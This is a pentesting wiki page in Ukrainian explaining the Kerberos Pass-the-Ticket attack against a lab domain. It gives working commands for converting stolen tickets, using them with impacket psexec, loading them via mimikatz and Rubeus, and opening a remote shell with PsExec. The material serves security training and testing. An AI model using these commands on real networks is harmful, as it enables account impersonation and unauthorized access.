# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

У методі атаки **Pass The Ticket (PTT)** атакувальники **викрадають authentication ticket користувача** замість його пароля або значень hash. Потім цей викрадений ticket використовується для **імперсонації користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у межах мережі.<sup>[[1]](#references)</sup>

**Читайте**:

- [Збір tickets із Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Збір tickets із Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Обмін Linux і Windows tickets між платформами**

Інструмент [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) конвертує формати tickets, використовуючи лише сам ticket і вихідний файл.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
У Windows можна використовувати [Kekeo](https://github.com/gentilkiwi/kekeo).

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Посилання

- [1] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
